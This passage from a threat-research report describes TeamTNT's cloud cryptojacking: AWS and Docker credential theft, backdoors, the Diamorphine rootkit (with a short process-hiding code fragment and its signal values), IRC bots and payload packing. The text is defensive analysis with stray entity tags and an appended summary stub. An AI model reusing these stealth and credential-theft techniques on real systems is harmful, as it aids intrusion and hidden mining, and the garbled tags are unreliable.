home folder . But the group soon released a newervariant that expanded the search to other users , with the end goal of gaining access to any credentialsplaced by customers in ~/.aws / credentials.1214 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [ORG] GroupThe newer versions of the malware now search multiple locations and check environment variables wherecustomers might have placed AWS credentials . The primary targets of these functions are users who usethe AWS command - line interface tool or AWS frameworks that allow saving of authorization informationon the user \u2019s machine \u2014 in either plain - text files or plain - text variables . Docker API Credential TheftIn [DATE] January [DATE] 2021 , we acquired via a container honeypot a sample that showed an interesting behavior : Itsearches compromised systems not only for [ORG] SSH and AWS credentials but also for [PERSON] Docker API credentials . Any credential files that the malware finds are uploaded to a command - and - control ( [ORG] C&C ) server . Figure [CARDINAL] 15 . An example of code used by TeamTNT to search for compromised systems fromwhich the group could steal [PERSON] Docker API credentialsDocker users who wish to manage the service remotely can customize the API with their desired settings \u2014 from no security whatsoever to cryptography and credential requirements . While data from Shodanshows that the number of unsecure [PERSON] Docker APIs have been decreasing , malicious actors are alsoseemingly adapting to the times by customizing their malware further . Advanced Credential HarvestingIn [DATE] 2021 , we discovered a TeamTNT campaign with extended credential harvesting capabilities targetingcustomers of multiple cloud services and other services that potential victims might be using . Theseinclude AWS , [ORG] Cloudflare , [PERSON] Google [PERSON] Cloud , [PERSON] Git , SMB services , [ORG] FTP , and other services where credentialsmight be present.1315 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupBackdoorsAs TeamTNT continuously develops and tests its payloads , we have seen the group deploy multiplebackdoors , including [CARDINAL] two open - source remote shells.14One is named tshd ( tiny shell daemon ) . Using keywords from the reversed binary , we were able to track itback to the open - source [ORG] GitHub project . The other backdoor is inspired by Q - shell , a remote shell usingBlowfish encryption for transmitted data . However , the dominant payload is the adopted [ORG] IRC bot wedescribe in the later section on TeamTNT \u2019s [ORG] IRC bot . Figure [CARDINAL] 16 . Examples of the backdoors used by TeamTNT16 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupDiamorphine [PERSON] RootkitAnother trend we observed in [DATE] 2020 is the integration of rootkits into [GPE] Linux - based threats for persistenceand stealth.15 Stealth , in particular , is a crucial factor for cryptocurrency mining activities since , withoutany limitations in place , the mining process will quickly raise red flags as the CPU utilization spikes to100 % . Even if this anomalous behavior is not spotted by an administrator , it will likely trigger warnings inthe cloud provider \u2019s system , which will then send a notification to the user . To get around this , malwareauthors have introduced new features to hide the process from administrators and system tools . TeamTNT is no exception . The group uses a kernel - mode open - source rootkit called [PERSON] Diamorphine,16 whichcreates function hooks for the following system calls:\u2022 getdents / getdents64 : This hook allows hiding file system entries from user - mode applications . Theactual process hiding is implemented in this hook as the Unix uses the /proc pseudo - file system asan interface to kernel process structures.\u2022 kill : This hook implements the main functionality of the rootkit , which is dependent on the signal sentto the process based on the following:\u00ba The signal SIGINVIS = [CARDINAL] 31 flips the process custom [GPE] PF_INVISIBLE flag to the task associated withthe specified process ID ( pid).if ( ( task = find_task(pid ) ) = = NULL)return -ESRCH;task->flags [DATE] ^= PF_INVISIBLE;break;\u00ba The signal SIGSUPER = [CARDINAL] 64 obtains root privileges by committing new credentials with uids = 0.\u00ba The signal SIGMODINVIS = [CARDINAL] 63 hides / reveals the presence of the kernel module.17 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupDiamorphine is used for hiding the cryptocurrency mining process in which , in this context , the kernelmodule itself is hidden by default as the hide function is called during the module initialization phase . Figure [CARDINAL] 17 . The [PERSON] Diamorphine module initialization phaseThe following discussion demonstrates the described behavior of [PERSON] Diamorphine . After the cryptocurrency process using [ORG] XMRig is started , the signal [ORG] SIGINVIS is sent to the mining process . Figure [CARDINAL] 18 . The [ORG] XMRig processThis is done by executing the kill utility with the argument [ORG] SIGINVIS and the target process ID . The utilitycalls linux syscall , which is then intercepted by [PERSON] Diamorphine , rendering the process invisible to user - modeapplications . Figure [CARDINAL] 19 . Sending a SIGINVIS signal to the [PERSON] Diamorphine rootkit , effectively hidingthe cryptocurrency mining processIf we compare the output of the top utility before the hiding signal is sent to the rootkit module and afterthe signal is sent , we can observe that the [ORG] XMRig process ( pid = [DATE] 12254 ) is causing the CPU usage [ORG] tospike.1718 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure 20 . The top output before the signal is sentHowever , after the hiding signal is sent , the process is not seen by the utility and remains undetected . At this point , we should emphasize that a root user permission with CAP_SYS_ADMIN capability isrequired to install the kernel module . As malware authors target container environments , there is thedanger of privileged containers that allow users to obtain full host root with all capabilities and thus canalso be used to install kernel mode rootkits such as [PERSON] Diamorphine . [PERSON] Malware authors have also optimized the usability of [PERSON] XMRig for cloud environments by decreasing themaximum percentage of CPU usage in order to remain undetected and not trigger necessary alarms . Itshould be noted that running unwanted cryptocurrency miners in public clouds will lead to additionalcosts.19 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupNotable Payload FunctionalitiesTeamTNT deploys a number of payloads in its campaigns , including cryptocurrency miners , credentialstealers , and even [ORG] IRC bots ( which we discuss in a later section ) . Many of these payloads have interestingfunctionalities that are designed to make them stealthier and more efficient . [PERSON] Pushing [PERSON] Out the [PRODUCT] CompetitionWhen a security weakness in an internet - connected device is present , there is a high chance that multipleattackers will target it for their own purposes . Given that some malware , such as cryptocurrency miners , often makes heavy use of hardware resources , malicious actors often find it necessary to ensure that noother malicious actors are running their own payloads , since this will result in resources being split amongthe payloads . TeamTNT is no different , as the group has implemented its own ever - evolving functions for pushing outcompeting cryptocurrency miners . An example of this is mentioned in a previous section ; in that example , TeamTNT pushes out traces of Kinsing in a target \u2019s system . Figure [CARDINAL] 21 . A function showing how a cryptocurrency miner from TeamTNT pushes out [ORG] the [ORG] competition20 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure [CARDINAL] 22 . Neutralizing traces of Kinsing in the target \u2019s systemPersistence MechanismsThe [ORDINAL] second stage of a TeamTNT payload is typically designed for persistence , where it will be executedagain even after the affected device is restarted . This is typically accomplished via a cryptocurrency minersystem service . Figure [CARDINAL] 23 . Creating persistence by deploying system services21 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupCustom [PERSON] User AgentEarly versions of TeamTNT \u2019s payloads used downloads via wget18 and curl19 without any additionalparameters . Over time , the group introduced a custom user agent20 HTTP header into its shell scripts , allowing them to have special handling routines on the server side for providing better statistics or limitingpayload downloads for specified agents . The user agent header varies across TeamTNT \u2019s campaigns . Figure [CARDINAL] 24 . An example of TeamTNT \u2019s custom user agent usageLockdownThe lockdown function [ORDINAL] first removes an immutability flag that might have been set on the binaries \u2014 which are used for shutting down or rebooting the targeted machine \u2014 for protective reasons . The scriptthen removes any execution permission from the binaries and finally sets the immutability property again , making sure that the binaries can not be replaced , be modified , or have their permissions changed . Altering the properties is done using chattr , which is clever since this command is not well known . Figure [CARDINAL] 25 . The lockdown function in action22 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupAccount [PERSON] CreationIn some campaigns , TeamTNT creates a new user in the affected system in order to gain future access . The group also includes its own [ORG] SSH public key to be able to log in using its private key via the key pairauthentication system.21Figure [CARDINAL] 26 . Creating a new system accountMasquerading the [ORG] PayloadThe initial payloads deployed by TeamTNT were distributed without any obfuscation , encryption , orpacking , with the deploying shell scripts being written in plain text . Eventually , the group evolved itspayloads by replacing the plain - text shell scripts with ones that had [PERSON] Base64 encoding . In the case of [ORG] ELF binaries , TeamTNT started by using packers such as the popular multiplatformexecutable packer [ORG] UPX ( [ORG] Ultimate [ORG] Packer for Executables).22 The next version added another layer ontop of the packed UPX executable , a Go - compiled binary with a payload , encrypted via [ORG] AES ( [ORG] AdvancedEncryption [ORG] Standard ) , with a hard - coded key and initialization vector . The packer used is based on theEzuri packer , a freely available project on GitHub.2323 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure 27 . Using the [GPE] Ezuri packer in [CARDINAL] one of TeamTNT \u2019s campaigns24 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupIRC Bot [ORG] EvolutionChatbots provide a number of specific functions . For example , they can be used for game notifications , build notifications , or status messages in corporate environments . But they can also be used for maliciouspurposes . Together with open protocol specifications and open - source software , chatbots can be usedto deploy communication channels for malicious actors . An [ORG] IRC server can act as the [ORG] C&C module ofmalware , sending commands to connected bots ( infected clients ) . An example of a malicious [ORG] IRC bot isthe notorious [ORG] Dorkbot , which exfiltrates credentials in an infected system via [ORG] IRC messages.24One of the [ORDINAL] first known pieces of malware targeting [NORP] IoT devices was [PERSON] Hydra , which was released in [CARDINAL] 2008.It used [ORG] IRC botnets \u2014 that is , networks of [ORG] IRC bots \u2014 in its DDoS attacks.25 [DATE] Two [DATE] years [DATE] later , [PERSON] Kaiten ( akaTsunami ) extended bot capabilities by adding several functionalities , such as a bot - killing feature thatremoves traces of previous infections from an infected router.26Figure [CARDINAL] 28 . The help function showing available commands from the leaked [ORG] Kaiten source [ORG] codeTeamTNT also has its own [ORG] IRC bot in its attacks . Based on the nonstripped information left by the compileras well as the bot \u2019s functions , we can surmise that the initial version of the [ORG] IRC bot used by the group isbased on Kaiten.25 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure 29 . The nonstripped kaiten.c compile information indicating that the initial versionof TeamTNT \u2019s [ORG] IRC bot is based on [GPE] KaitenAs the source code is publicly available on [ORG] GitHub , it is no surprise that malicious actors are already usingthis software . Figure [CARDINAL] 30 . TeamTNT \u2019s [ORG] IRC bot decompiledLater versions of the bot are based on an evolved [PERSON] Kaiten variant called [PERSON] Ziggy [PERSON] StarTux , which introducesnew commands and a simple transposition cipher to encrypt \u201c confidential \u201d strings such as the serveraddress . Figure [CARDINAL] 31 . A snippet of the [ORG] Ziggy [ORG] StarTux source code with new commands addedIt is likely that the introduction of a new version of the bot was a result of the group \u2019s looking to expandthe functionalities of the base version.26 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupAs if to stamp its mark on the tool , TeamTNT started to place its own signatures on the [ORG] IRC bot , in additionto its modifications . Figure [CARDINAL] 32 . A version of TeamTNT \u2019s [ORG] IRC bot that includes a custom signatureThe group also implemented its own commands , which are used to download the source and compile thedelivery scheme on a victim machine . Figure [CARDINAL] 33 . New commands added by TeamTNT to its [ORG] IRC botShell scriptVariant ABinarydownloadVariant [ORG] BSource code compilationVariant CBase64 encodingFigure [CARDINAL] 34 . TeamTNT \u2019s [ORG] IRC bot deployment27 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupImpact of Cryptocurrency Mining ActivitiesCryptocurrencies have changed how malware monetization works . [CARDINAL] One example of this is the use ofcryptocurrencies for ransomware payments , which lends transactions both anonymity and the potentialfor easy [GPE] laundering.27 Another type of cryptocurrency monetization is cryptocurrency mining , which , although not malicious by itself , is often brought upon unsuspecting users by malicious actors . Most devices often do not provide enough computational power for effective cryptocurrency mining . Thus , to compensate for this lack , malicious actors often either target more powerful and efficient devicesor simply use a sizeable botnet in a quantity - over - quality scenario . In any case , cryptocurrency miningdemands plenty in terms of hardware , electricity , and other associated resources . [CARDINAL] One of the frequenttargets of cryptocurrency mining attacks is Linux systems with open and unsecure services and APIs , such as container engines that provide benefits to organizations in the development and environmentalstability of deployed applications . With the global market capitalization of cryptocurrencies at US$ 1.63 [MONEY] trillion at the time of this writing ( June2021),28 cryptocurrency mining is a lucrative opportunity for monetization . During our investigation ofTeamTNT , we found several wallet IDs connected to the same cryptocurrency pool , [GPE] gulf[.]moneroocean[.]stream . Using the pool statistics of the wallets , we discovered that the group had mined [CARDINAL] more [CARDINAL] than [CARDINAL] 17.86Monero coins . Because of the high volatility of the exchange rate over time , we could only estimate the [ORG] USdollar value to range from US$ 1,100 [MONEY] to US$ 3,800 within the time frame from [DATE] March [DATE] 2020 [DATE] to [DATE] March 2021.2928 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupFigure [CARDINAL] 35 . An example of TeamTNT \u2019s active mining pool usage from infected nodesWhile [CARDINAL] 17.86 [PERSON] Monero coins might not look high , the real cost of mining such an amount might paint adifferent picture . To estimate the corresponding cost , we did an experiment using a [CARDINAL] 3.0 - gigahertz , [CARDINAL] 6 - coreIntel i5 - 8500B Coffee Lake CPU with [CARDINAL] 8 gigabytes of [ORG] RAM , which is not a high - end platform and has noGPU that can enhance cryptocurrency mining . Our model hardware was able to produce [CARDINAL] 1,000 hashesper [ORDINAL] second on average over a [TIME] 24 [TIME] - hour period . This performance is above average compared to thenumber of hashes per [ORDINAL] second from infected nodes shown in Figure [CARDINAL] 35.Our hardware was able to mine [CARDINAL] 0.0005 [PERSON] Monero coins within [TIME] 24 [TIME] hours . To mine [CARDINAL] 17.86 [PERSON] Monero coins , wewould need [CARDINAL] approximately [CARDINAL] 35,600 infected devices with the same specifications mining for [TIME] 24 [TIME] hours . If weassume that the power consumption of the CPU is [CARDINAL] 100 watts , then the electrical energy needed for thatwould be [QUANTITY] 85.44 megawatt [QUANTITY] - [QUANTITY] hours ( MWh ) . If we use a conversion of [CARDINAL] 1 MWh equaling US$ [MONEY] 140 , we wouldget an electricity bill of US$ [MONEY] 11,961.60 \u2014 not even taking into account the damage caused by operatingat [PERCENT] 100 % load . If we have to pay the electricity bill for the mining activities , we would lose over US$ [MONEY] 9,000 in our modelcase . It should be noted that the real amount will be different as there are many variables to consider . For instance , the price of electricity varies by geographic location , and not every machine has the sameperformance or power efficiency . Still , the losses for users who have their machines used for miningactivities will be considerable.29 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupConclusionMalware monetization remains a strong motivator for malicious actors . With organizations focusing oncloud technologies amid the Covid-19 pandemic , it is not surprising to see malicious actor groups shiftingtheir operations to the cloud as it becomes an increasingly lucrative target . Cryptocurrency mining remainspopular as a monetization method because of its stealth and heavy automation , allowing malicious actorsto deploy their malware with relative ease . The availability of open - source software like [PERSON] Diamorphine alsoprovides malicious actor groups with additional tools for their arsenal . TeamTNT itself has been shifting its focus to cloud technologies . In its recent campaigns , the group hasbeen actively searching for cloud credentials , exploiting server misconfigurations , and competing in thecryptocurrency mining sphere . Given what we have seen from the group in a relatively short time , we canexpect TeamTNT to continuously evolve its tools and techniques.30 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor GroupRecommendationsWe have been seeing an increasing focus on cloud - based attacks and campaigns among groupssuch as TeamTNT , which are looking to take advantage of organizations shifting to cloud services . Organizations should therefore be especially vigilant with their cloud implementations , paying heedto the shared responsibility model , in which the CSPs are responsible for securing the infrastructurewhile the organizations are responsible for handling the cloud assets , such as data , applications , andconfigurations.30We recommend that security personnel and IT administrators implement best practices such as thefollowing to minimize the chance of a successful attack from a cloud - focused group like TeamTNT:\u2022 Apply the principle of least privilege , in which users are granted access only to the parts of the systemthey need , to reduce the attack surface and help contain damage even in the event of a [ORG] successfulattack.31\u2022 For organizations that have [ORG] SSH enabled , implement private keys authentication on the client side toenhance access control security.\u2022 [ORG] Update systems and devices regularly to reduce the probability that vulnerabilities are exploited.32Cloud - focused security solutions such as the Trend Micro Cloud One \u2122 security services platform33 helpsprotect cloud - native systems by providing protection for continuous - integration and continuous - delivery(CI / CD ) pipelines and applications . The platform includes:\u2022 [ORG] Workload [ORG] Security : runtime protection for workloads\u2022 Container Security : automated container image and registry scanning\u2022 File Storage Security : security for cloud files and object storage services\u2022 Network Security : cloud network layer for intrusion prevention system ( [ORG] IPS ) security\u2022 Application Security : security for serverless functions , APIs , and applications\u2022 Conformity : real - time security for cloud infrastructure \u2014 secure , optimize , comply31 | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [ORG] GroupAppendixMITRE [ORG] ATT&CK [ORG] Tactics and [PERSON] TechniquesReconnaissanceActive scanningResource facing applicationCommand and scripting interpreterAccount manipulationGather victim host informationCompromise infrastructureValid accountsInter - process communicationGather victim network informationEstablish accountsTrusted relationshipNative APIScheduled task / jobShared modulesSoftware deployment toolsSystem servicesDefense evasionCredential accessDiscoveryBoot or logon autostart executionCompromise client software binaryImplant container [NORP] Decode files or informationImpair defensesRootkitSteal application access tokenAccount discoveryUnsecured credentialsCloud infrastructure discoveryFile and directory discoveryLateral tool transferUse alternate scanningProcess discoveryRemote system discoverySystem service discovery32 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [PERSON] GroupCollectionCommand andcontrolExfiltrationImpactArchive collected exfiltrationIngress tool transferMultistage channelsExfiltration over [ORG] C&C channelExfiltration over web serviceAutomated collectionData from local repositoryEndpoint denial of serviceResource hijackingService stopSystem shutdown/ SH.AWSKEYGRAB.A/16.723.00Backdoor . Linux . MALXMR . BreakOutTheBox . A/16.703.00HackTool . Linux . BreakOutTheBox . [PERSON] A/16.703.00Backdoor . Linux . TSUNAMI . Accessed on [DATE] May [DATE] 31 , [DATE] 2021 , at url for - resources.html.3 RA Markus v. [PERSON] Hohenhau . ( [DATE] Dec. [DATE] 30 , [DATE] 2011 ) . fachanwalt-it.blogspot.com . \u201c [ORG] Stellenanzeigen [ORG] - [ORG] Betrug [ORG] / [ORG] Geldw\u00e4sche [ORG] - [ORG] SocialEngineering . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [PERSON] Augusto [PERSON] Remillano [PERSON] II and [ORG] Jemimah [ORG] Molina . ( [DATE] May [DATE] 6 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Coinminer , DDoS Bot Attack Docker Daemon Ports . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url bot - attack - docker - daemon - ports.5 [PERSON] David [PERSON] Fiser . ( [DATE] Dec. [DATE] 18 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Now Deploying DDoS - Capable [ORG] IRC Bot TNTbotinger . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] Jan. [DATE] 8 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Malicious [ORG] Shell [ORG] Script Steals Cloud Credentials . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , aturl [PERSON] Horejsi and [PERSON] David [PERSON] Fiser . ( [DATE] Nov. [DATE] 24 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] Kinsing [WORK_OF_ART] Malware \u2019s [WORK_OF_ART] Use [WORK_OF_ART] of [WORK_OF_ART] Rootkit . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [ORG] Trend [ORG] Micro . ( [DATE] April [DATE] 7 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Misconfigured Docker Daemon API Ports Attacked for Kinsing Malware Campaign . \u201dAccessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url docker - daemon - api - ports - attacked - for - kinsing - malware - campaign.9 bboreham . ( [DATE] Jan. [DATE] 30 , [DATE] 2021 ) . GitHub . \u201c weaveworks / scope . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 at url [PERSON] Kishore [PERSON] Angrishi . ( [DATE] Feb. [DATE] 13 , [DATE] 2017 ) . arXiv . \u201c Turning Internet of Things ( [ORG] IoT ) into Internet of Vulnerabilities ( [ORG] IoV ): [ORG] IoT [ORG] Botnets . \u201dAccessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] March [DATE] 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT [PERSON] Continues [PERSON] Attack on the Cloud , Targets AWSCredentials . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url the - cloud -- targets - aws - credentials.html.12 [ORG] Amazon [ORG] Web [ORG] Services . ( n.d . ) . [ORG] Amazon [ORG] Web [ORG] Services . \u201c Configuration and credential file settings . \u201d Accessed on [DATE] May [DATE] 24 , 2021at url [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] May [DATE] 18 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT \u2019s Extended Credential Harvester Targets CloudServices , Other Software . \u201d Accessed on [DATE] May [DATE] 31 , [DATE] 2021 , at url extended - credential - harvester - targets - cloud - services - other - software.html.14 [PERSON] David [PERSON] Fiser . ( [DATE] Dec. [DATE] 18 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c TeamTNT Now Deploying DDoS - Capable [ORG] IRC Bot TNTbotinger . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [PERSON] Jaromir [PERSON] Horejsi and [PERSON] David [PERSON] Fiser . ( [DATE] Nov. [DATE] 24 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Analysis [WORK_OF_ART] of [WORK_OF_ART] Kinsing [WORK_OF_ART] Malware \u2019s [WORK_OF_ART] Use [WORK_OF_ART] of [WORK_OF_ART] Rootkit . \u201d Accessed onMay [DATE] 24 , [DATE] 2021 , at url [ORG] m0nad . ( [DATE] May [DATE] 13 , [DATE] 2021 ) . GitHub . \u201c Diamorphine . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [PERSON] Michael [PERSON] Kerrisk . ( n.d ) . man7.org . \u201c top(1 ) \u2014 Linux manual page . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url GNU Operating System . ( n.d . ) . [PRODUCT] GNU [PRODUCT] Operating [PRODUCT] System . \u201c GNU Wget . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url curl . ( n.d . ) . curl . \u201c command line tool and library for transferring data with URLs ( since [DATE] 1998 ) . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , aturl [ORG] Mozilla . ( n.d . ) . MDN Web Docs . \u201c User - Agent . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [ORG] Group21 [ORG] SSH [ORG] Academy . ( n.d . ) . [ORG] SSH [ORG] Academy . \u201c [WORK_OF_ART] Key [WORK_OF_ART] Pair [WORK_OF_ART] - [WORK_OF_ART] Public [WORK_OF_ART] and [WORK_OF_ART] Private . \u201d Accessed on [DATE] May [DATE] 31 , [DATE] 2021 , at url#key - pair --- public - and - private.22 UPX . ( n.d . ) . UPX . \u201c UPX . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url guitmz . ( [DATE] March [DATE] 23 , [DATE] 2021 ) . GitHub . \u201c ezury . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url [WORK_OF_ART] Oscar [WORK_OF_ART] Celestino [PERSON] Angelo [PERSON] Abendan ll . ( [DATE] Nov. [DATE] 5 , [DATE] 2012 ) . [ORG] Trend [ORG] Micro . \u201c DORKBOT Resurfaces [PERSON] Via [PERSON] Skype . \u201d Accessed on [DATE] May [DATE] 24,2021 , at url [PERSON] Patrick [PERSON] Macgregor . ( [DATE] 2018 ) . insecurety.net . \u201c Hydra [ORG] IRC bot , the [TIME] 25 [TIME] minute overview of the kit . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , aturl [PERSON] Stephen [PERSON] Hilt , [PERSON] Fernando [PERSON] Merc\u00eas , [PERSON] Mayra [PERSON] Rosario , and [PERSON] David [PERSON] Sancho . ( [DATE] July [DATE] 7 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro . \u201c Worm War : [ORG] The [ORG] Botnet [ORG] Battlefor [ORG] IoT [ORG] Territory . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url botnet - battle - for - iot - territory.pdf.27 [PERSON] Simon [PERSON] Usborne . ( [DATE] May [DATE] 15 , [DATE] 2017 ) . The [ORG] Guardian . \u201c [ORG] Digital gold : why hackers love [PERSON] Bitcoin . \u201d Accessed on [DATE] May [DATE] 31 , [DATE] 2021 , aturl [ORG] CoinMarketCap . ( n.d . ) . CoinMarketCap . \u201c Today \u2019s [WORK_OF_ART] Cryptocurrency [WORK_OF_ART] Prices [WORK_OF_ART] by [PERSON] Market [PERSON] Cap . \u201d Accessed on [DATE] June [DATE] 2 , [DATE] 2021 , aturl [ORG] Cointelegraph . ( n.d . ) . [ORG] Cointelegraph . \u201c Monero Price Index . \u201d Accessed on [DATE] June [DATE] 2 , [DATE] 2021 , at url [PERSON] Mark [PERSON] Nunnikhoven . ( [DATE] Oct. [DATE] 22 , [DATE] 2019 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] The [WORK_OF_ART] Shared [WORK_OF_ART] Responsibility [WORK_OF_ART] Model . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 at url [PERSON] Magno [PERSON] Logan . ( [DATE] May 27 , [DATE] 2020 ) . [ORG] Trend [ORG] Micro . \u201c Securing the 4 Cs of [ORG] Cloud [ORG] - Native [ORG] Systems : Cloud , Cluster , Container , [DATE] andCode . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url the-4 - cs - of - cloud - native - systems - cloud - cluster - container - and - code.32 Trend Micro . ( [DATE] Oct. [DATE] 25 , [DATE] 2018 ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Virtual Patching : [WORK_OF_ART] Patch [WORK_OF_ART] Those [WORK_OF_ART] Vulnerabilities [WORK_OF_ART] before [WORK_OF_ART] They [WORK_OF_ART] Can [WORK_OF_ART] Be [WORK_OF_ART] Exploited . \u201dAccessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url patching - patch - those - vulnerabilities - before - they - can - be - exploited.33 Trend Micro . ( n.d . ) . [ORG] Trend [ORG] Micro . \u201c [WORK_OF_ART] Security [WORK_OF_ART] for [WORK_OF_ART] Cloud [WORK_OF_ART] Migration . \u201d Accessed on [DATE] May [DATE] 24 , [DATE] 2021 , at url | Tracking the Activities of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor [ORG] GroupTREND [ORG] MICROTM [ORG] RESEARCHTrend [ORG] Micro , a global leader in cybersecurity , helps to make the world safe for exchanging digital information . [ORG] Trend [ORG] Micro [ORG] Research is powered by experts who are passionate about discovering new threats , sharing key insights , and supporting efforts to stop cybercriminals . Our global team helps identify [CARDINAL] millions of threats [DATE] daily , leads the industry in vulnerability disclosures , and publishes innovative research on new threat techniques . We continually work to anticipate new threats and deliver thought- provoking [ORG] research.www.trendmicro.com40 [ORG] | [ORG] Tracking [ORG] the [ORG] Activities [ORG] of TeamTNT : [WORK_OF_ART] A [WORK_OF_ART] Closer [WORK_OF_ART] Look at a Cloud - Focused Malicious Actor Group", "generated_text": "Hacking; TeamTNT; Linux; organizations; 2020; early 2021; targets; the group; social media; profile; communication; actors; German; German speakers; the group; employees; an overview; the Linux environment; its activities; the group; insight; resources; infrastructure; expertise; detection; processes; the malware; command; control; servers; the threat landscape; insights; the development; techniques.", "ref_text": "<START-1>The PDF is a report from Trend Micro about a malicious hacking group called TeamTNT. TeamTNT is a group of at least 12 people, likely German-native speakers, who hack systems to steal credentials and deploy cryptocurrency miners. TeamTNT targets Linux environments and cloud infrastructures. They use scanners to find vulnerable systems, then deploy payloads like credential stealers for SSH, AWS, Docker, and more. They also deploy cryptocurrency miners, IRC bots for command and control, and rootkits like Diamorphine for stealth. TeamTNT runs campaigns with names like Covid-19, Black-T, Kinsing Killer, and AWS Stealer. The group evolves their tactics, using advanced techniques like searching for misconfigurations instead of exploits. In 2020-2021, TeamTNT increasingly focused on stealing cloud credentials and mining cryptocurrency in the cloud. The impact of TeamTNT's cryptojacking can be 